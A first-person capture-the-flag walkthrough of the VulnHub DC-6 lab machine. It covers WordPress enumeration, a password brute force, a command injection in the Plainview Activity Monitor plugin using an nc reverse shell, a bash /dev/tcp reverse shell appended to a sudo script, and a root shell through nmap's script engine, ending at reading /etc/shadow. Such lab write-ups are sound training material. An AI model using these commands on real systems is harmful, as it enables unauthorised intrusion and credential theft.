# DC-6 | VulnHub
https://www.vulnhub.com/entry/dc-6,315/

### 1. Scan
```bash
sudo nmap -A -p- -T4 192.168.34.146
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-06 00:26 EST
Nmap scan report for 192.168.34.146
Host is up (0.00090s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd (RSA)
|   256 3c:83:65:71:dd:73:d7:23:f8:83:0d:e3:46:bc:b5:6f (ECDSA)
|_  256 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Did not follow redirect to http://wordy/
MAC Address: 00:0C:29:00:51:F3 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.90 ms 192.168.34.146

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.55 seconds
```
The machine is running SSH and an Apache web server.

### 2. Enumerate website
It's a wordpress website with a few pages, with the following content:
  
*Welcome to Wordy, a world leader in the area of WordPress Plugins and Security.  
At Wordy, we know just how important it is to have secure plugins, and for this reason, we endeavour to provide the most secure and up-to-date plugins that are available on the market.
At Wordy, we employ only the best developers so that we can provide you with the most secure plugins.
Our lead developer, Jens Dagmeister, has over twenty years of experience in PHP development, and 18 months of experience in developing secure WordPress plugins.
You can put your faith in us.*
  
Scan the site. Note that in order to find the plugins I need aggressive detection.
```bash
┌──(kali㉿kali)-[~/Desktop/vhb]
└─$ wpscan --url wordy --plugins-detection aggressive --plugins-version-detection aggressive --enumerate u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.11
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://wordy/ [192.168.34.146]
[+] Started: Sat Mar  6 01:10:00 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.25 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://wordy/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: http://wordy/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://wordy/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.1.1 identified (Insecure, released on 2019-03-13).
 | Found By: Rss Generator (Passive Detection)
 |  - http://wordy/index.php/feed/, <generator>https://wordpress.org/?v=5.1.1</generator>
 |  - http://wordy/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.1.1</generator>
 |
 | [!] 24 vulnerabilities identified:
 |
 | [!] Title: WordPress <= 5.2.2 - Cross-Site Scripting (XSS) in URL Sanitisation
 |     Fixed in: 5.1.2
 |     References:
 |      - https://wpscan.com/vulnerability/4494a903-5a73-4cad-8c14-1e7b4da2be61
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16222
 |      - https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/30ac67579559fe42251b5a9f887211bf61a8ed68
 |      - https://hackerone.com/reports/339483
 |
 | [!] Title: WordPress 5.0-5.2.2 - Authenticated Stored XSS in Shortcode Previews
 |     Fixed in: 5.1.2
 |     References:
 |      - https://wpscan.com/vulnerability/8aca2325-14b8-4b9d-94bd-d20b2c3b0c77
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16219
 |      - https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/
 |      - https://fortiguard.com/zeroday/FG-VD-18-165
 |      - https://www.fortinet.com/blog/threat-research/wordpress-core-stored-xss-vulnerability.html
 |
 | [!] Title: WordPress <= 5.2.3 - Stored XSS in Customizer
 |     Fixed in: 5.1.3
 |     References:
 |      - https://wpscan.com/vulnerability/d39a7b84-28b9-4916-a2fc-6192ceb6fa56
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17674
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.2.3 - Unauthenticated View Private/Draft Posts
 |     Fixed in: 5.1.3
 |     References:
 |      - https://wpscan.com/vulnerability/3413b879-785f-4c9f-aa8a-5a4a1d5e0ba2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17671
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |      - https://github.com/WordPress/WordPress/commit/f82ed753cf00329a5e41f2cb6dc521085136f308
 |      - https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/
 |
 | [!] Title: WordPress <= 5.2.3 - Stored XSS in Style Tags
 |     Fixed in: 5.1.3
 |     References:
 |      - https://wpscan.com/vulnerability/d005b1f8-749d-438a-8818-21fba45c6465
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17672
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.2.3 - JSON Request Cache Poisoning
 |     Fixed in: 5.1.3
 |     References:
 |      - https://wpscan.com/vulnerability/7804d8ed-457a-407e-83a7-345d3bbe07b2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17673
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://github.com/WordPress/WordPress/commit/b224c251adfa16a5f84074a3c0886270c9df38de
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.2.3 - Server-Side Request Forgery (SSRF) in URL Validation 
 |     Fixed in: 5.1.3
 |     References:
 |      - https://wpscan.com/vulnerability/26a26de2-d598-405d-b00c-61f71cfacff6
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17669
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17670
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://github.com/WordPress/WordPress/commit/9db44754b9e4044690a6c32fd74b9d5fe26b07b2
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.2.3 - Admin Referrer Validation
 |     Fixed in: 5.1.3
 |     References:
 |      - https://wpscan.com/vulnerability/715c00e3-5302-44ad-b914-131c162c3f71
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17675
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://github.com/WordPress/WordPress/commit/b183fd1cca0b44a92f0264823dd9f22d2fd8b8d0
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.3 - Authenticated Improper Access Controls in REST API
 |     Fixed in: 5.1.4
 |     References:
 |      - https://wpscan.com/vulnerability/4a6de154-5fbd-4c80-acd3-8902ee431bd8
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-20043
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16788
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-g7rg-hchx-c2gw
 |
 | [!] Title: WordPress <= 5.3 - Authenticated Stored XSS via Crafted Links
 |     Fixed in: 5.1.4
 |     References:
 |      - https://wpscan.com/vulnerability/23553517-34e3-40a9-a406-f3ffbe9dd265
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16773
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
 |      - https://hackerone.com/reports/509930
 |      - https://github.com/WordPress/wordpress-develop/commit/1f7f3f1f59567e2504f0fbebd51ccf004b3ccb1d
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-xvg2-m2f4-83m7
 |
 | [!] Title: WordPress <= 5.3 - Authenticated Stored XSS via Block Editor Content
 |     Fixed in: 5.1.4
 |     References:
 |      - https://wpscan.com/vulnerability/be794159-4486-4ae1-a5cc-5c190e5ddf5f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16781
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16780
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-pg4x-64rh-3c9v
 |
 | [!] Title: WordPress <= 5.3 - wp_kses_bad_protocol() Colon Bypass
 |     Fixed in: 5.1.4
 |     References:
 |      - https://wpscan.com/vulnerability/8fac612b-95d2-477a-a7d6-e5ec0bb9ca52
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-20041
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/b1975463dd995da19bb40d3fa0786498717e3c53
 |
 | [!] Title: WordPress < 5.4.1 - Password Reset Tokens Failed to Be Properly Invalidated
 |     Fixed in: 5.1.5
 |     References:
 |      - https://wpscan.com/vulnerability/7db191c0-d112-4f08-a419-a1cd81928c4e
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11027
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47634/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-ww7v-jg8c-q6jw
 |
 | [!] Title: WordPress < 5.4.1 - Unauthenticated Users View Private Posts
 |     Fixed in: 5.1.5
 |     References:
 |      - https://wpscan.com/vulnerability/d1e1ba25-98c9-4ae7-8027-9632fb825a56
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11028
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47635/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-xhx9-759f-6p2w
 |
 | [!] Title: WordPress < 5.4.1 - Authenticated Cross-Site Scripting (XSS) in Customizer
 |     Fixed in: 5.1.5
 |     References:
 |      - https://wpscan.com/vulnerability/4eee26bd-a27e-4509-a3a5-8019dd48e429
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11025
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47633/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-4mhg-j6fx-5g3c
 |
 | [!] Title: WordPress < 5.4.1 - Cross-Site Scripting (XSS) in wp-object-cache
 |     Fixed in: 5.1.5
 |     References:
 |      - https://wpscan.com/vulnerability/e721d8b9-a38f-44ac-8520-b4a9ed6a5157
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11029
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47637/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-568w-8m88-8g2c
 |
 | [!] Title: WordPress < 5.4.1 - Authenticated Cross-Site Scripting (XSS) in File Uploads
 |     Fixed in: 5.1.5
 |     References:
 |      - https://wpscan.com/vulnerability/55438b63-5fc9-4812-afc4-2f1eff800d5f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11026
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47638/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-3gw2-4656-pfr2
 |      - https://hackerone.com/reports/179695
 |
 | [!] Title: WordPress <= 5.2.3 - Hardening Bypass
 |     Fixed in: 5.1.3
 |     References:
 |      - https://wpscan.com/vulnerability/378d7df5-bce2-406a-86b2-ff79cd699920
 |      - https://blog.ripstech.com/2020/wordpress-hardening-bypass/
 |      - https://hackerone.com/reports/436928
 |      - https://wordpress.org/news/2019/11/wordpress-5-2-4-update/
 |
 | [!] Title: WordPress < 5.4.2 - Authenticated XSS in Block Editor
 |     Fixed in: 5.1.6
 |     References:
 |      - https://wpscan.com/vulnerability/831e4a94-239c-4061-b66e-f5ca0dbb84fa
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-4046
 |      - https://wordpress.org/news/2020/06/wordpress-5-4-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-rpwf-hrh2-39jf
 |      - https://pentest.co.uk/labs/research/subtle-stored-xss-wordpress-core/
 |      - https://www.youtube.com/watch?v=tCh7Y8z8fb4
 |
 | [!] Title: WordPress < 5.4.2 - Authenticated XSS via Media Files
 |     Fixed in: 5.1.6
 |     References:
 |      - https://wpscan.com/vulnerability/741d07d1-2476-430a-b82f-e1228a9343a4
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-4047
 |      - https://wordpress.org/news/2020/06/wordpress-5-4-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-8q2w-5m27-wm27
 |
 | [!] Title: WordPress < 5.4.2 - Open Redirection
 |     Fixed in: 5.1.6
 |     References:
 |      - https://wpscan.com/vulnerability/12855f02-432e-4484-af09-7d0fbf596909
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-4048
 |      - https://wordpress.org/news/2020/06/wordpress-5-4-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/10e2a50c523cf0b9785555a688d7d36a40fbeccf
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-q6pw-gvf4-5fj5
 |
 | [!] Title: WordPress < 5.4.2 - Authenticated Stored XSS via Theme Upload
 |     Fixed in: 5.1.6
 |     References:
 |      - https://wpscan.com/vulnerability/d8addb42-e70b-4439-b828-fd0697e5d9d4
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-4049
 |      - https://www.exploit-db.com/exploits/48770/
 |      - https://wordpress.org/news/2020/06/wordpress-5-4-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-87h4-phjv-rm6p
 |      - https://hackerone.com/reports/406289
 |
 | [!] Title: WordPress < 5.4.2 - Misuse of set-screen-option Leading to Privilege Escalation
 |     Fixed in: 5.1.6
 |     References:
 |      - https://wpscan.com/vulnerability/b6f69ff1-4c11-48d2-b512-c65168988c45
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-4050
 |      - https://wordpress.org/news/2020/06/wordpress-5-4-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/dda0ccdd18f6532481406cabede19ae2ed1f575d
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-4vpv-fgg2-gcqc
 |
 | [!] Title: WordPress < 5.4.2 - Disclosure of Password-Protected Page/Post Comments
 |     Fixed in: 5.1.6
 |     References:
 |      - https://wpscan.com/vulnerability/eea6dbf5-e298-44a7-9b0d-f078ad4741f9
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-25286
 |      - https://wordpress.org/news/2020/06/wordpress-5-4-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/c075eec24f2f3214ab0d0fb0120a23082e6b1122

[+] WordPress theme in use: twentyseventeen
 | Location: http://wordy/wp-content/themes/twentyseventeen/
 | Last Updated: 2020-12-09T00:00:00.000Z
 | Readme: http://wordy/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 2.5
 | Style URL: http://wordy/wp-content/themes/twentyseventeen/style.css?ver=5.1.1
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://wordy/wp-content/themes/twentyseventeen/style.css?ver=5.1.1, Match: 'Version: 2.1'

[+] Enumerating All Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:03:25 <===========================================================================================================================================================================================================================================================================================================================> (92180 / 92180) 100.00% Time: 00:03:25
[+] Checking Plugin Versions (via Aggressive Methods)

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://wordy/wp-content/plugins/akismet/
 | Latest Version: 4.1.9
 | Last Updated: 2021-03-02T18:10:00.000Z
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://wordy/wp-content/plugins/akismet/, status: 403
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: Akismet 2.5.0-3.1.4 - Unauthenticated Stored Cross-Site Scripting (XSS)
 |     Fixed in: 3.1.5
 |     References:
 |      - https://wpscan.com/vulnerability/1a2f3094-5970-4251-9ed0-ec595a0cd26c
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-9357
 |      - http://blog.akismet.com/2015/10/13/akismet-3-1-5-wordpress/
 |      - https://blog.sucuri.net/2015/10/security-advisory-stored-xss-in-akismet-wordpress-plugin.html
 |
 | The version could not be determined.

[+] plainview-activity-monitor
 | Location: http://wordy/wp-content/plugins/plainview-activity-monitor/
 | Last Updated: 2018-08-26T15:08:00.000Z
 | Readme: http://wordy/wp-content/plugins/plainview-activity-monitor/readme.txt
 | [!] The version is out of date, the latest version is 20180826
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://wordy/wp-content/plugins/plainview-activity-monitor/, status: 200
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: Plainview Activity Monitor <= 20161228 - Remote Command Execution (RCE)
 |     Fixed in: 20180826
 |     References:
 |      - https://wpscan.com/vulnerability/ab749b6c-c405-40e0-8417-0fe1bdb8537c
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15877
 |      - https://plugins.trac.wordpress.org/changeset/1930493/plainview-activity-monitor
 |      - https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_plainview_activity_monitor_rce
 |
 | Version: 20161228 (50% confidence)
 | Found By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://wordy/wp-content/plugins/plainview-activity-monitor/readme.txt

[+] user-role-editor
 | Location: http://wordy/wp-content/plugins/user-role-editor/
 | Last Updated: 2021-02-26T04:17:00.000Z
 | Readme: http://wordy/wp-content/plugins/user-role-editor/readme.txt
 | [!] The version is out of date, the latest version is 4.58.3
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://wordy/wp-content/plugins/user-role-editor/, status: 200
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: User Role Editor <= 4.24 - Privilege Escalation
 |     Fixed in: 4.25
 |     References:
 |      - https://wpscan.com/vulnerability/85e595f5-9f04-4799-9a09-c6675071b12c
 |      - https://www.wordfence.com/blog/2016/04/user-role-editor-vulnerability/
 |
 | Version: 4.24 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://wordy/wp-content/plugins/user-role-editor/readme.txt

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <=================================================================================================================================================================================================================================================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://wordy/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] jens
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] sarah
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] graham
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] mark
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 2
 | Requests Remaining: 18

[+] Finished: Sat Mar  6 01:10:04 2021
[+] Requests Done: 21
[+] Cached Requests: 49
[+] Data Sent: 5.295 KB
[+] Data Received: 43.111 KB
[+] Memory used: 128.684 MB
[+] Elapsed time: 00:00:03
```
There are 5 valid users, and also some vulnerabilities in the plugins allowing for privesc and command execution. From here I can run a wordlist against each known user.
```bash
┌──(kali㉿kali)-[~/Desktop/vhb]
└─$ wpscan --url wordy -U wp-users.txt -P rockyou.txt
...
[+] Performing password attack on Xmlrpc against 5 user/s
[SUCCESS] - mark / helpdesk01

[!] Valid Combinations Found:
 | Username: mark, Password: helpdesk01
...
```
Wordpress credentials are recovered as: `mark:helpdesk01`

### 3. Log in to wordpress
Wordpress can be logged into using the above creds. As the user "mark", I have the role of helpdesk which appears quite limited, but the user does have access to the plainview activity monitor.
The users details are:
```
Graham Bond	graham@blahblahblah1.net.au	Contributor
Jens Dagmeister	jens@blahblahblah1.net.au	Senior Developer
Mark Jones	mark@blahblahblah1.net.au	Help Desk
Sarah Balin	sarah@blahblahblah1.net.au	Editor
```

### 4. Get a shell
References:
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15877  
- https://www.exploit-db.com/exploits/45274  
  
*WordPress Plainview Activity Monitor plugin is vulnerable to OS command injection which allows an attacker to remotely execute commands on the underlying system. Application passes unsafe user supplied data to ip parameter into activities_overview.php. Privileges are required in order to exploit this vulnerability. Vulnerable plugin version: 20161228 and possibly prior. Fixed plugin version: 20180826.*
  
Navigating to the "tools" page on the activity monitor, first use inspect element to remove the length limit on the "ip" field. Then enter `aa.com | nc -e /bin/bash 192.168.34.141 9999` and hit the "lookup" button. The command gets executed a shell is returned in the started nc listener.
```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [192.168.34.141] from (UNKNOWN) [192.168.34.146] 55092

whoami
www-data
```

### 5. Enumerate from foothold
There are no additional web server files outside of the wordpress ones. However I can list and view files in the user directories.
```bash
www-data@dc-6:/home$ ls -Rl
.:
total 16
drwxr-xr-x 2 graham graham 4096 Apr 26  2019 graham
drwxr-xr-x 2 jens   jens   4096 Apr 26  2019 jens
drwxr-xr-x 3 mark   mark   4096 Apr 26  2019 mark
drwxr-xr-x 2 sarah  sarah  4096 Apr 24  2019 sarah

./graham:
total 0

./jens:
total 4
-rwxrwxr-x 1 jens devs 50 Apr 26  2019 backups.sh

./mark:
total 4
drwxr-xr-x 2 mark mark 4096 Apr 26  2019 stuff

./mark/stuff:
total 4
-rw-r--r-- 1 mark mark 241 Apr 26  2019 things-to-do.txt

./sarah:
total 0

www-data@dc-6:/home$ cat jens/backups.sh
cat jens/backups.sh
#!/bin/bash
tar -czf backups.tar.gz /var/www/html
www-data@dc-6:/home$ cat mark/stuff/things-to-do.txt
cat mark/stuff/things-to-do.txt
Things to do:

- Restore full functionality for the hyperdrive (need to speak to Jens)
- Buy present for Sarah's farewell party
- Add new user: graham - GSo7isUM1D4 - done
- Apply for the OSCP course
- Buy new laptop for Sarah's replacement
```
Firstly it can be seen that there is a backups script to archive the contents of var/www/html. Secondly there is another set of credentials in mark's list: `graham:GSo7isUM1D4`

### 6. Escalate to a user
Log into SSH with Graham's credentials.
```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ ssh graham@wordy              
The authenticity of host 'wordy (192.168.34.146)' can't be established.
ECDSA key fingerprint is SHA256:jlerdCouZvnDhR/1oNiOrfqqzChsDT0gm8uG96kRY2U.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'wordy,192.168.34.146' (ECDSA) to the list of known hosts.
graham@wordy's password: 
Linux dc-6 4.9.0-8-amd64 #1 SMP Debian 4.9.144-3.1 (2019-02-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
graham@dc-6:~$ id
uid=1001(graham) gid=1001(graham) groups=1001(graham),1005(devs)
```

### 7. Enumerate from user
The backup script can be ran as the "jens" user from here.
```bash
graham@dc-6:~$ sudo -l
Matching Defaults entries for graham on dc-6:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User graham may run the following commands on dc-6:
    (jens) NOPASSWD: /home/jens/backups.sh
```
Additionally, since this user is in the devs group, it would appear the user will have write permission to the script.
```bash
graham@dc-6:/home/jens$ ls -la
total 28
drwxr-xr-x 2 jens jens 4096 Apr 26  2019 .
drwxr-xr-x 6 root root 4096 Apr 26  2019 ..
-rwxrwxr-x 1 jens devs   50 Apr 26  2019 backups.sh
-rw------- 1 jens jens    5 Apr 26  2019 .bash_history
-rw-r--r-- 1 jens jens  220 Apr 24  2019 .bash_logout
-rw-r--r-- 1 jens jens 3526 Apr 24  2019 .bashrc
-rw-r--r-- 1 jens jens  675 Apr 24  2019 .profile
```

### 8. Lateral movement
Firstly backup the file and then echo in a bash line to spawn a new shell in nc, then run the script as jen.
```bash
graham@dc-6:/home/jens$ cat backups.sh > ~/backups_backup.sh
graham@dc-6:/home/jens$ echo "bash -i >& /dev/tcp/192.168.34.141/9999 0>&1" >> backups.sh
graham@dc-6:/home/jens$ sudo -u jens /home/jens/backups.sh
```
Catch the shell.
```bash
┌──(kali㉿kali)-[~/Desktop/vhb]
└─$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [192.168.34.141] from (UNKNOWN) [192.168.34.146] 55094
jens@dc-6:/home/graham$ id
id
uid=1004(jens) gid=1004(jens) groups=1004(jens),1005(devs)
```

### 9. More enumeration from new user
Check sudo perms again:
```bash
jens@dc-6:~$ sudo -l
Matching Defaults entries for jens on dc-6:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jens may run the following commands on dc-6:
    (root) NOPASSWD: /usr/bin/nmap
```
The user can run nmap as root. Because of this, privesc to root is possible.

### 10. Escalate to root
Check version of nmap:
```bash
jens@dc-6:~$ sudo nmap --version
sudo nmap --version

Nmap version 7.40 ( https://nmap.org )
Platform: x86_64-pc-linux-gnu
Compiled with: liblua-5.3.3 openssl-1.1.0c libpcre-8.39 libpcap-1.8.1 nmap-libdnet-1.12 ipv6
Compiled without:
Available nsock engines: epoll poll select
```
The interactive option is not available in this version, so I create and provide a script instead.
```bash
jens@dc-6:~$ TF=$(mktemp)
TF=$(mktemp)
jens@dc-6:~$ echo 'os.execute("/bin/sh")' > $TF
echo 'os.execute("/bin/sh")' > $TF
jens@dc-6:~$ sudo nmap --script=$TF
sudo nmap --script=$TF

Starting Nmap 7.40 ( https://nmap.org ) at 2021-03-06 17:22 AEST
NSE: Warning: Loading '/tmp/tmp.Hmf1JNAKtn' -- the recommended file extension is '.nse'.

whoami
root

cat /etc/shadow
